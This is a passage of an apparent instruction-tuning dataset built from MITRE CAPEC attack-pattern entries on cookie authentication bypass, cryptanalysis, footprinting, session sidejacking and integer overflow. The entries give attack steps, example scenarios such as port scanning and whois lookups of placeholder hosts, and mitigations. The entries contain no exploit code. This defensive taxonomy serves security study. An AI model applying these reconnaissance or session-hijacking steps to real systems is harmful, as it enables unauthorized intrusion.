            "Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "472"
            },
            {
              "@CWE_ID": "565"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "233"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Cryptanalysis (CAPEC ID: 97)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Cryptanalysis (CAPEC ID: 97) are: A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter \"E\" in an English language occurs with a certain known frequency (about 12.7%), whatever \"E\" was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter \"E\" in an English language occurs with a certain known frequency (about 12.7%), whatever \"E\" was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis.",
      "@Name": "Cryptanalysis (CAPEC ID: 97)",
      "attack_ptrn": {
        "@ID": "97",
        "@Name": "Cryptanalysis",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "192"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "20"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target software utilizes some sort of cryptographic algorithm.",
            "An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.",
            "The encryption algorithm is known to the attacker.",
            "An attacker has access to the ciphertext."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Cryptanalysis generally requires a very significant level of understanding of mathematics and computation."
          }
        },
        "Resources_Required": {
          "Resource": "Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use proven cryptographic algorithms with recommended key sizes.",
            {
              "xhtml:p": "Ensure that the algorithms are used properly. That means:",
              "xhtml:ul": {
                "xhtml:li": [
                  "1. Not rolling out your own crypto; Use proven algorithms and implementations.",
                  "2. Choosing initialization vectors with sufficiently random numbers",
                  "3. Generating key material using good sources of randomness and avoiding known weak keys",
                  "4. Using proven protocols and their implementations.",
                  "5. Picking the most appropriate cryptographic algorithm for your usage context and data"
                ]
              }
            }
          ]
        },
        "Example_Instances": {
          "Example": "A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter \"E\" in an English language occurs with a certain known frequency (about 12.7%), whatever \"E\" was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "327"
            },
            {
              "@CWE_ID": "1204"
            },
            {
              "@CWE_ID": "1240"
            },
            {
              "@CWE_ID": "1241"
            },
            {
              "@CWE_ID": "1279"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Cryptanalysis"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-556",
            "@Section": "Cryptanalysis"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description, Description Summary, Examples-Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Footprinting (CAPEC ID: 169)",
    "context": "",
    "output": "Possible examples: In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.",
      "@Name": "Footprinting (CAPEC ID: 169)",
      "attack_ptrn": {
        "@ID": "169",
        "@Name": "Footprinting",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary engages in probing and exploration activities to identify constituents and properties of the target.",
        "Extended_Description": {
          "xhtml:p": "Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. Although similar to fingerprinting, footprinting aims to get a more holistic view of a system or network, whereas fingerprinting is more targeted to a specific application or operating system. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very Low",
        "Execution_Flow": {
          "Attack_Step": {
            "Step": "1",
            "Phase": "Explore",
            "Description": "[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.",
            "Technique": [
              "Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.",
              "Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.",
              "DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.",
              "Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network."
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary knows how to send HTTP request, run the scan tool."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Keep patches up to date by installing weekly or daily if possible.",
            "Shut down unnecessary services/ports.",
            "Change default passwords by choosing strong passwords.",
            "Curtail unexpected input.",
            "Encrypt and password-protect sensitive data.",
            "Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents."
          ]
        },
        "Example_Instances": {
          "Example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1217",
              "Entry_Name": "Browser Bookmark Discovery"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1592",
              "Entry_Name": "Gather Victim Host Information"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1595",
              "Entry_Name": "Active Scanning"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-31"
            },
            {
              "@External_Reference_ID": "REF-32"
            },
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 38-39"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.1 Introduction, pg. 47"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Session Sidejacking (CAPEC ID: 102)",
    "context": "",
    "output": "Possible examples: The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.",
      "@Name": "Session Sidejacking (CAPEC ID: 102)",
      "attack_ptrn": {
        "@ID": "102",
        "@Name": "Session Sidejacking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "593"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.",
              "Technique": "The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies their knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Capture session token] The attacker uses sniffing tools to capture a session token from traffic."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker and the victim are both using the same WiFi network.",
            "The victim has an active session with a target system.",
            "The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)",
            "The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically \"rings home\" asynchronously using the session token"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Easy to use tools exist to automate this attack."
          }
        },
        "Resources_Required": {
          "Resource": "A packet sniffing tool, such as wireshark, can be used to capture session information."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.",
            "Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks."
          ]
        },
        "Example_Instances": {
          "Example": "The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "523"
            },
            {
              "@CWE_ID": "319"
            },
            {
              "@CWE_ID": "614"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Forced Integer Overflow (CAPEC ID: 92)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544"
      ],
      "@Name": "Forced Integer Overflow (CAPEC ID: 92)",
      "attack_ptrn": {
        "@ID": "92",
        "@Name": "Forced Integer Overflow",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "128"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "The first step is exploratory meaning the attacker looks for an integer variable that they can control."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "The attacker finds an integer variable that they can write into or manipulate and try to get the value of the integer out of the possible range."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "The integer variable is forced to have a value out of range which set its final value to an unexpected value."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "The target host acts on the data and unexpected behavior may happen."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker can manipulate the value of an integer variable utilized by the target host.",
            "The target host does not do proper range checking on the variable before utilizing it.",
            "When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)"
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "An attacker can simply overflow an integer by inserting an out of range value."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use a language or compiler that performs automatic bounds checking.",
            "Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.",
            "Use an abstraction library to abstract away risky APIs. Not a complete solution.",
            "Always do bound checking before consuming user input data."
          ]
        },
        "Example_Instances": {
          "Example": [
